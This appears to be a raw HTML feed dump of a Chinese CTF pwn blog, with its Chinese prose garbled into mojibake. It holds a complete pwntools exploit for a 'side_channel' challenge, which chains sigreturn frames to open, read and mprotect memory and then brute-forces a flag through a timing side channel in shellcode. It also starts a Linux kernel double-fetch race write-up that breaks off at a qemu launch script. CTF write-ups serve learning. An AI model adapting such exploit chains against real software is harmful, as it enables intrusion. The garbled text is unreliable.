class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ‰‹å¿«å…ˆäº¤äº†</p></blockquote><h2 id="side-channel"><a href="#side-channel" class="headerlink" title="side_channel"></a>side_channel</h2><h3 id="ç¨‹åºåˆ†æ-1"><a href="#ç¨‹åºåˆ†æ-1" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><p>è·Ÿä¸Šé¢˜å‡ ä¹ä¸€æ¨¡ä¸€æ ·ï¼Œä¸è¿‡ç¦ç”¨äº†writeçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå…è®¸mprotect<br><img src="/EXP_FILE/5176030fd7a52aad5cb4772e0a96851d_MD5.jpeg"></p><p>é‡‡ç”¨ä¾§ä¿¡é“æ”»å‡»æ¥çˆ†ç ´</p><blockquote><p>ç”±äºç¨‹åºä¸­çš„æ²™ç›’ç¦ç”¨äº†è¾“å‡ºæµï¼Œè‡´ä½¿æˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥è·å¾—flagçš„æ˜æ–‡ï¼Œè¿™å°±æ˜¯ä¸»ä¿¡é“è·å–ä¿¡æ¯çš„æ–¹å¼å·²ç»ä¸èƒ½å¤Ÿè¢«å®ç°ï¼Œç„¶åæˆ‘ä»¬ä½¿ç”¨flagä¸­å¯èƒ½æœ‰çš„æ‰€æœ‰å­—ç¬¦å½“ä½œå­—å…¸ï¼Œé€ä½è¿›è¡Œçˆ†ç ´ï¼Œé€šè¿‡<strong>è¿”å›çš„ä¸åŒä¿¡æ¯æ¥åˆ¤æ–­flagçš„æ˜æ–‡ã€‚è¿™å°±æ˜¯ä¾§ä¿¡é“æ”»å‡»çš„æ€æƒ³</strong>ã€‚</p></blockquote><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>è°ƒç”¨mprotectåˆ’bssä¸ºrwxæƒé™ï¼Œåœ¨ä¸Šé¢å¸ƒç½®shellcode</p><pre class="line-numbers language-python" data-language="python"><div class="caption"><span>TI:"è‡ªå†™exp"</span></div><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>ch<span class="token punctuation">)</span><span class="token punctuation">:</span>syscall_p_ret<span class="token operator">=</span><span class="token number">0x000000000040118a</span>sigreturn_ret<span class="token operator">=</span><span class="token number">0x0000000000401194</span>leave_ret<span class="token operator">=</span><span class="token number">0x000000000040136c</span>bss<span class="token operator">=</span><span class="token number">0x0000000000404060</span><span class="token comment">#------------open</span>sigframe_open <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_open<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">2</span>sigframe_open<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x110</span> <span class="token comment">#flag_addr</span>sigframe_open<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>sigframe_open<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>sigframe_open<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token operator">-</span><span class="token number">8</span>sigframe_open<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_open<span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">b'./flag\x00\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token comment">#--------------read</span>sigframe_read <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_read<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>sigframe_read<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">3</span>sigframe_read<span class="token punctuation">.</span>rsi <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x800</span>sigframe_read<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x100</span>sigframe_read<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">8</span>sigframe_read<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_read<span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#-------------mprotect</span>sigframe_mprotect <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe_mprotect<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">10</span>sigframe_mprotect<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bss<span class="token operator">&amp;</span><span class="token number">0xfffff000</span>sigframe_mprotect<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>sigframe_mprotect<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>sigframe_mprotect<span class="token punctuation">.</span>rsp <span class="token operator">=</span> bss<span class="token operator">+</span><span class="token number">0x600</span><span class="token operator">-</span><span class="token number">8</span>sigframe_mprotect<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_p_retpayload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sigreturn_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall_p_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe_mprotect<span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x600</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token comment">#------------shellcode</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x600</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#shellcode_addr</span>shellcode<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'''mov rsi, 0x404860'''</span></span><span class="token keyword">if</span> idx <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>shellcode <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'''cmp byte ptr[rsi+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">], </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ch<span class="token punctuation">&#125;</span></span><span class="token string">jz $-3mov al,0x3csyscall'''</span></span><span class="token keyword">else</span><span class="token punctuation">:</span>shellcode <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'''cmp byte ptr[rsi+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">], </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ch<span class="token punctuation">&#125;</span></span><span class="token string">jz $-4ret'''</span></span><span class="token comment">#--------------------------</span>payload<span class="token operator">+=</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'easyhack\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2a</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x404668\nc\n')</span>sa<span class="token punctuation">(</span><span class="token string">'SUID?\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">pass</span>end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'found: '</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> ch<span class="token keyword">else</span><span class="token punctuation">:</span>log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">'not found'</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">None</span><span class="token comment">#itr()</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">'./chall'</span><span class="token comment">#context.log_level='debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#pwn(0,ord('f'))</span>flag<span class="token operator">=</span><span class="token string">''</span>idx<span class="token operator">=</span><span class="token number">0</span>possible_list <span class="token operator">=</span> <span class="token string">"-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>possible_list<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./chall'</span><span class="token punctuation">)</span>ch<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>possible_list<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> pwn<span class="token punctuation">(</span>idx<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>ret <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> possible_list<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m flag: &#123;&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>idx <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">break</span>                <span class="token keyword">elif</span><span class="token punctuation">(</span>ret <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> possible_list<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'SUCCESS!!!'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>left<span class="token operator">+=</span><span class="token number">1</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>åœ¨æœ¬åœ°æ˜¯èƒ½é€šçš„ï¼Œè¿œç¨‹å¥½åƒæœ‰é—®é¢˜ã€‚æ¯”èµ›ä¸­é€”ä½“æµ‹å»äº†å›æ¥å·²æœ‰å¸ˆå‚…è§£å‡º</p></blockquote><h2 id="my-qq"><a href="#my-qq" class="headerlink" title="my_qq"></a>my_qq</h2><h3 id="ç¨‹åºåˆ†æ-2"><a href="#ç¨‹åºåˆ†æ-2" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>double fetch</title>
      <link href="/2023/12/24/double%20fetch/"/>
      <url>/2023/12/24/double%20fetch/</url>
      
        <content type="html"><![CDATA[<blockquote><p>é€šå¸¸æƒ…å†µä¸‹åœ¨ç”¨æˆ·æ€ä¸‹çš„ pwn å½“ä¸­æˆ‘ä»¬åªæœ‰ä¸€ä¸ªç‹¬ç«‹è¿è¡Œçš„ä¸»çº¿ç¨‹ï¼Œå¹¶ä¸å­˜åœ¨æ‰€è°“æ¡ä»¶ç«äº‰çš„æƒ…å†µï¼Œä½†åœ¨ kernel pwn å½“ä¸­ç”±æ”»å‡»è€…è´Ÿè´£ç¼–å†™ç”¨æˆ·æ€ç¨‹åºï¼Œå¯ä»¥å¾ˆè½»æ˜“åœ°å¯åŠ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è¿è¡Œï¼Œä»è€Œè½»æ˜“åœ°äº§ç”Ÿæ¡ä»¶ç«äº‰ã€‚<a href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-wang.pdf">åŸè®ºæ–‡</a><br>å‚è€ƒæ–‡ç« ï¼š<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/race/double-fetch/">Double Fetch - CTF Wiki (ctf-wiki.org)</a><br><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#double-fetch">ã€PWN.0x00ã€‘Linux Kernel Pwn Iï¼šBasic Exploit to Kernel Pwn in CTF - arttnba3â€™s blog</a></p></blockquote><h1 id="ä¸€ã€åŸç†"><a href="#ä¸€ã€åŸç†" class="headerlink" title="ä¸€ã€åŸç†"></a>ä¸€ã€åŸç†</h1><p><code>Double Fetch</code>Â ä»æ¼æ´åŸç†ä¸Šå±äºæ¡ä»¶ç«äº‰æ¼æ´ï¼Œæ˜¯ä¸€ç§å†…æ ¸æ€ä¸ç”¨æˆ·æ€ä¹‹é—´çš„æ•°æ®è®¿é—®ç«äº‰ã€‚</p><p>åœ¨ Linux ç­‰ç°ä»£æ“ä½œç³»ç»Ÿä¸­ï¼Œè™šæ‹Ÿå†…å­˜åœ°å€é€šå¸¸è¢«åˆ’åˆ†ä¸ºå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ã€‚å†…æ ¸ç©ºé—´è´Ÿè´£è¿è¡Œå†…æ ¸ä»£ç ã€é©±åŠ¨æ¨¡å—ä»£ç ç­‰ï¼Œæƒé™è¾ƒé«˜ã€‚è€Œç”¨æˆ·ç©ºé—´è¿è¡Œç”¨æˆ·ä»£ç ï¼Œå¹¶é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸å®Œæˆç›¸å…³åŠŸèƒ½ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·ç©ºé—´å‘å†…æ ¸ä¼ é€’æ•°æ®æ—¶ï¼Œå†…æ ¸å…ˆé€šè¿‡é€šè¿‡Â <code>copy_from_user</code>Â ç­‰æ‹·è´å‡½æ•°å°†ç”¨æˆ·æ•°æ®æ‹·è´è‡³å†…æ ¸ç©ºé—´è¿›è¡Œæ ¡éªŒåŠç›¸å…³å¤„ç†ï¼Œ<strong>ä½†åœ¨è¾“å…¥æ•°æ®è¾ƒä¸ºå¤æ‚æ—¶ï¼Œå†…æ ¸å¯èƒ½åªå¼•ç”¨å…¶æŒ‡é’ˆï¼Œè€Œå°†æ•°æ®æš‚æ—¶ä¿å­˜åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œåç»­å¤„ç†ã€‚æ­¤æ—¶ï¼Œè¯¥æ•°æ®å­˜åœ¨è¢«å…¶ä»–æ¶æ„çº¿ç¨‹ç¯¡æ”¹é£é™©ï¼Œé€ æˆå†…æ ¸éªŒè¯é€šè¿‡æ•°æ®ä¸å®é™…ä½¿ç”¨æ•°æ®ä¸ä¸€è‡´ï¼Œå¯¼è‡´å†…æ ¸ä»£ç æ‰§è¡Œå¼‚å¸¸ã€‚</strong></p><p>ä¸€ä¸ªå…¸å‹çš„Â <code>Double Fetch</code>Â æ¼æ´åŸç†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸€ä¸ªç”¨æˆ·æ€çº¿ç¨‹å‡†å¤‡æ•°æ®å¹¶é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸ï¼Œè¯¥æ•°æ®åœ¨å†…æ ¸ä¸­æœ‰ä¸¤æ¬¡è¢«å–ç”¨ï¼Œå†…æ ¸ç¬¬ä¸€æ¬¡å–ç”¨æ•°æ®è¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼ˆå¦‚ç¼“å†²åŒºå¤§å°ã€æŒ‡é’ˆå¯ç”¨æ€§ç­‰ï¼‰ï¼Œå½“æ£€æŸ¥é€šè¿‡åå†…æ ¸ç¬¬äºŒæ¬¡å–ç”¨æ•°æ®è¿›è¡Œå®é™…å¤„ç†ã€‚è€Œåœ¨ä¸¤æ¬¡å–ç”¨æ•°æ®ä¹‹é—´ï¼Œå¦ä¸€ä¸ªç”¨æˆ·æ€çº¿ç¨‹å¯åˆ›é€ æ¡ä»¶ç«äº‰ï¼Œå¯¹å·²é€šè¿‡æ£€æŸ¥çš„ç”¨æˆ·æ€æ•°æ®è¿›è¡Œç¯¡æ”¹ï¼Œåœ¨çœŸå®ä½¿ç”¨æ—¶é€ æˆè®¿é—®è¶Šç•Œæˆ–ç¼“å†²åŒºæº¢å‡ºï¼Œæœ€ç»ˆå¯¼è‡´å†…æ ¸å´©æºƒæˆ–æƒé™æå‡ã€‚</p><p><img src="/Binary_FILE/6d85660472c166f79b1b5e7cfd817980_MD5.jpeg"></p><p>é€šè¿‡åœ¨ first fetch ä¸ second fetch ä¹‹é—´çš„ç©ºæŒ¡ä¿®æ”¹æ•°æ®ä»è€Œæ”¹å˜å†…æ ¸æ‰§è¡Œæµçš„åˆ©ç”¨æ‰‹æ³•ä¾¿è¢«ç§°ä¹‹ä¸º<code>double fetch</code></p><h1 id="äºŒã€0CTF2018-Final-baby-kernel"><a href="#äºŒã€0CTF2018-Final-baby-kernel" class="headerlink" title="äºŒã€0CTF2018 Final - baby kernel"></a>äºŒã€0CTF2018 Final - baby kernel</h1><h2 id="ä¸€-ç¨‹åºåˆ†æ"><a href="#ä¸€-ç¨‹åºåˆ†æ" class="headerlink" title="(ä¸€)ç¨‹åºåˆ†æ"></a>(ä¸€)ç¨‹åºåˆ†æ</h2><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 <span class="token punctuation">\</span><span class="token parameter variable">-m</span> 256M <span class="token parameter variable">-smp</span> <span class="token number">2</span>,cores<span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">1</span>  <span class="token punctuation">\</span><span class="token parameter variable">-kernel</span> ./vmlinuz-4.15.0-22-generic <span class="token punctuation">\</span><span class="token parameter variable">-initrd</span>  ./core.cpio <span class="token punctuation">\</span><span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet"</span> <span class="token punctuation">\</span><span class="token parameter variable">-cpu</span> qemu64 <span class="token punctuation">\</span><span class="token parameter variable">-netdev</span> user,id<span class="token operator">=</span>t0, <span class="token parameter 